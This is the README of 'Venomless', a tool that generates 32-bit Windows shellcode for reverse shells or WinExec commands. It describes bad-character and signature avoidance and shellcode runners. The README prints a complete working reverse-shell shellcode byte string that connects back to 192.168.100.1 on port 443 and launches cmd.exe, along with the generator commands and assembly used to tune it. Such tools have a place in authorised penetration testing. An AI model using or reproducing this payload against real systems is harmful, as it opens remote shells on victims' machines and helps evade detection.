# Summary 

Venomless is a custom 32-bit windows shellcode generator designed to provide either a reverse shell or the execution of a specified command through winexec. The shellcode that is generated can be checked for the presence of bad characters and customized in order to avoid bad characters or signatures. 

The generate.py contains a Position Independent Shellcode stub and several custom functions to make creating any win32 API call much easier. This includes a formatString function to format putting strings onto the stack as well as a loadLibrary function that will load a library, find a function within it and store it within an EBP offset.

Venomless uses the keystone engine and can output shellcode in several formats (python, csharp, c, raw, assembly, keystone).

It can also provide simple payloads in c, python and csharp format as well as shellcode runners in those languages.

## usage

The following will create a python script for generating the shellcode for a reverse shell. The assembly can be customized to avoid bad characters or signatures.

`venomless.py -r -l 192.168.100.1 -p 443 -t`


-r, --revshell                      Generate a reverse shell. Requires -l, --lhost and -p, --port arguments.
-c <command>, --cmd                 Creates a payload that uses the WinExec API call to perform a command. 
-o <filename>, --output             Outputs the shellcode to a text file 
-f, --format <format>
        formats:
        assembly              Outputs the assembly 
        keystone              Outputs a python script that contains the shellcode and will use the keystone engine to test the payload. Useful for editing out bad bytes. 
        python                Outputs the Shellcode in a python byte array. If -t set, then will generate a python script to test payload.
        csharp                Outputs the shellcode in a csharp byte array. If -t set, then will generate a .cs file to compile to test payload. 
        c                Outputs the shellcode in a c byte array. If -t set, then will generate a .c file to compile to test payload.

-b, --badchars      Will search for bad characters in output and highlight them. Will also provide basic disassembly of relevant shellcode.





# Introduction

Venomless is a custom 32-bit windows shellcode generator designed to provide either a reverse shell or the execution of a specified command. This is designed to be the starting point for custom windows payloads that the user can alter in order to avoid bad characters and heuristics. Venomless includes the ability to detect bad characters in the resulting shellcode and to output a keystone script with comments where the bad characters exist so that they can be easily altered. 

The generate.py uses the keystone engine and some custom QoL functions in order to create position-independent shellcode. These QoL functions can easily be used to call other windows APIs. formatString automates putting any string onto the stack, loadLibrary loads a library finds a function inside of it and stores it in a specified EBP offset.

# Installation

I highly recommend using a virtual environment.

requires keystone


# Usage

The following will create a python script for generating the shellcode for a reverse shell using keystone. The assembly can be customized to avoid bad characters or signatures.

`venomless.py -r -l 192.168.100.1 -p 443 -b 0x00,0x28,0xa0`
 
This will output a "badchars.py" keystone script by default which contains comments about which instructions are bad.

e.x:

```asm 
"start:"
"mov ebp, esp               ;"
######## Bad Character located at instruction below ############"
### 81 c4 a0 f6 ff ff : add esp, 0xfffff6A0        ;"
"add esp, 0xfffff6A0        ;"
"find_kernel32:"
"xor ecx, ecx               ;"
"mov esi, fs:[ecx+30h]      ;"
"mov esi, [esi+0Ch]         ;"
"mov esi, [esi+1Ch]         ;"
"next_module:"
```

This bad character can be adjusted by simply changing the value that is subtracted from esp. Once the instruction has been changed, the shellcode can be generated with badchars.py. 

```
Encoded 200 instructions
Looking for bad characters in all shellcode (simple test)
No bad characters found!
size = 398
shellcode = b"\x89\xe5\x81\xc4\xa4\xf6\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\xbf\xe0\xff\xff\xff\xf7\xdf\x01\xf7\x8b\x3f\x8b\x36\x66\x39\x4f\x18\x75\xea\xeb\x06\x5e\x89\x75\x04\xeb\x5c\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\xba\xe0\xff\xff\xff\xf7\xda\x01\xfa\x8b\x02\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x08\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x0c\x68\x72\xfe\xb3\x16\xff\x55\x04\x89\x45\x10\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x55\x0c\x89\xc3\x68\xcb\xed\xfc\x3b\xff\x55\x04\x89\x45\x14\x68\xd9\x09\xf5\xad\xff\x55\x04\x89\x45\x18\x68\x0c\xba\x2d\xb3\xff\x55\x04\x89\x45\x1c\x31\xc9\x89\xe0\x66\xb9\x90\x05\x29\xc8\x50\x31\xc0\x66\xb8\x02\x02\x50\xff\x55\x14\x31\xc0\x50\x50\x50\xb0\x06\x50\x2c\x05\x50\x40\x50\xff\x55\x18\x89\xc6\x31\xc0\x50\x50\x68\xc0\xa8\x64\x01\x66\xb8\x01\xbb\xc1\xe0\x10\x66\x83\xc0\x02\x50\x54\x5f\x31\xc0\x50\x50\x50\x50\x04\x10\x50\x57\x56\xff\x55\x1c\x56\x56\x56\x31\xc0\x50\x50\xb0\x7f\xfe\xc0\x31\xc9\xb1\x7f\xfe\xc1\x01\xc8\x50\x31\xc0\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\xb0\x44\x50\x54\x5f\x31\xc0\xb4\x65\xc1\xe0\x08\x66\xb8\x65\x78\x50\x68\x63\x6d\x64\x2e\x54\x5b\x89\xe0\x31\xc9\x66\xb9\x90\x03\x29\xc8\x50\x57\x31\xc0\x50\x50\x50\x40\x50\x48\x50\x50\x53\x50\xff\x55\x10\x31\xc0\x50\x6a\xff\xff\x55\x08"
```



-r, --revshell                      Generate a reverse shell. Requires -l, --lhost and -p, --port arguments.
-c <command>, --cmd                 Creates a payload that uses the WinExec API call to perform a command. 
-o <filename>, --output             Outputs the shellcode to a text file 
-f, --format <format>
        formats:
        assembly              Outputs the assembly
        raw                   Outputs raw shellcode in format "\xXX".
        keystone              Outputs a python script that contains the shellcode and will use the keystone engine to test the payload. Useful for editing out bad bytes. 
        python                Outputs the Shellcode in a python byte array. If -t set, then will generate a python script to test payload.
        csharp                Outputs the shellcode in a csharp byte array. If -t set, then will generate a .cs file to compile to test payload. 
        c                Outputs the shellcode in a c byte array. If -t set, then will generate a .c file to compile to test payload.

-b, --badchars      Will search for bad characters in shellcode and generate a keystone script with all found bad characters commented.


